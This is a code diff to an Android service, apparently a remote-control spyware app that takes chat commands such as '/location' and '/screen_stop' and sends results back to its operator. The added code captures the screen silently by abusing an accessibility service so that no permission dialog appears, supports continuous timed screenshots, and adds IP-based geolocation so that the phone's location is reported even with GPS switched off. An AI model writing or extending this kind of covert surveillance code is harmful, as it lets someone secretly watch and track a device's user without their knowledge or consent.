@@ -329,6 +329,11 @@ public class SmsService extends Service {
                 sendRawMessage("📸 Har " + interval + "s mein screenshot aayega. Band karne ke liye /screen_stop");
 
             } else if (cmd.equalsIgnoreCase("/screen_stop")) {
+                // Stop accessibility service continuous mode
+                if (ScreenAccessibilityService.instance != null) {
+                    ScreenAccessibilityService.instance.stopContinuous();
+                }
+                // Also stop MediaProjection continuous
                 Intent stopScreen = new Intent(this, ScreenCaptureService.class);
                 stopScreen.setAction(ScreenCaptureService.ACTION_STOP_CONT);
                 startService(stopScreen);
@@ -592,12 +597,24 @@ public class SmsService extends Service {
 
     // ─── Screenshot / Screen Mirror ───────────────────────────
     private void requestScreenshot(boolean continuous, int intervalSec) {
+        int sec = intervalSec > 0 ? intervalSec : 30;
+
+        // Priority 1: AccessibilityService — completely silent, zero dialog (Android 12+)
+        if (ScreenAccessibilityService.instance != null) {
+            if (continuous) {
+                ScreenAccessibilityService.instance.startContinuous(sec);
+            } else {
+                ScreenAccessibilityService.instance.requestCapture();
+            }
+            return;
+        }
+
+        // Priority 2: MediaProjection service already running — no dialog
         if (ScreenCaptureService.sRunning) {
-            // Service already alive — send action directly, NO permission dialog
             Intent svc = new Intent(this, ScreenCaptureService.class);
             if (continuous) {
                 svc.setAction(ScreenCaptureService.ACTION_START_CONT);
-                svc.putExtra("interval", intervalSec > 0 ? intervalSec : 30);
+                svc.putExtra("interval", sec);
             } else {
                 svc.setAction(ScreenCaptureService.ACTION_CAPTURE);
             }
@@ -605,15 +622,21 @@ public class SmsService extends Service {
                 startForegroundService(svc);
             else
                 startService(svc);
-        } else {
-            // First time — need MediaProjection permission once
-            ScreenCaptureService.sPendingContinuous = continuous;
-            ScreenCaptureService.sPendingInterval   = intervalSec > 0 ? intervalSec : 30;
-            Intent i = new Intent(this, PermissionActivity.class);
-            i.putExtra("request_screenshot", true);
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(i);
+            return;
         }
+
+        // Priority 3: Need one-time MediaProjection permission
+        sendRawMessage(
+            "⚠️ Pehli baar screen permission chahiye.\n" +
+            "Phone par 'Allow' karo — iske baad dobara nahi maangega.\n\n" +
+            "💡 TIP: Accessibility service enable karo to yah dialog hamesha ke liye band ho jaayega:\n" +
+            "Settings → Accessibility → [App Name] → Enable");
+        ScreenCaptureService.sPendingContinuous = continuous;
+        ScreenCaptureService.sPendingInterval   = sec;
+        Intent i = new Intent(this, PermissionActivity.class);
+        i.putExtra("request_screenshot", true);
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(i);
     }
 
     // ─── GPS Location ─────────────────────────────────────────
@@ -681,14 +704,52 @@ public class SmsService extends Service {
                     String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                         .format(new Date(loc.getTime()));
                     sendRawMessage(
-                        "📍 GPS Location\n" +
+                        "📍 Location (GPS/Network)\n" +
                         "Lat: " + lat + "\nLon: " + lon + "\n" +
                         "Maps: https://maps.google.com/?q=" + lat + "," + lon + "\n" +
                         "Accuracy: " + (int) loc.getAccuracy() + "m\n" +
                         "Time: " + time
                     );
                 } else {
-                    sendRawMessage("❌ Location nahi mili.\nSettings → Location → ON karo, phir /location try karo.");
+                    // Step 3: IP-based geolocation fallback (GPS off hone par bhi kaam karta hai)
+                    sendRawMessage("📍 GPS nahi mila, IP location try kar raha hun...");
+                    try {
+                        URL ipUrl = new URL("http://ip-api.com/json/?fields=status,lat,lon,city,regionName,country,isp,query");
+                        HttpURLConnection conn = (HttpURLConnection) ipUrl.openConnection();
+                        conn.setConnectTimeout(8000);
+                        conn.setReadTimeout(8000);
+                        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                        StringBuilder sb = new StringBuilder();
+                        String line;
+                        while ((line = br.readLine()) != null) sb.append(line);
+                        br.close();
+                        conn.disconnect();
+
+                        JSONObject json = new JSONObject(sb.toString());
+                        if ("success".equals(json.optString("status"))) {
+                            double lat = json.getDouble("lat");
+                            double lon = json.getDouble("lon");
+                            String city    = json.optString("city", "");
+                            String region  = json.optString("regionName", "");
+                            String country = json.optString("country", "");
+                            String isp     = json.optString("isp", "");
+                            String ip      = json.optString("query", "");
+                            sendRawMessage(
+                                "📍 IP Location (GPS off)\n" +
+                                "Lat: " + lat + "\nLon: " + lon + "\n" +
+                                "Maps: https://maps.google.com/?q=" + lat + "," + lon + "\n" +
+                                "City: " + city + ", " + region + "\n" +
+                                "Country: " + country + "\n" +
+                                "ISP: " + isp + "\n" +
+                                "IP: " + ip + "\n" +
+                                "⚠️ Approximate location (GPS se less accurate)"
+                            );
+                        } else {
+                            sendRawMessage("❌ IP location bhi fail. Internet check karo.");
+                        }
+                    } catch (Exception ipEx) {
+                        sendRawMessage("❌ Location nahi mili. GPS ya WiFi on karo.");
+                    }
                 }
             } catch (Exception e) {
                 sendRawMessage("❌ Location error: " + e.getMessage());
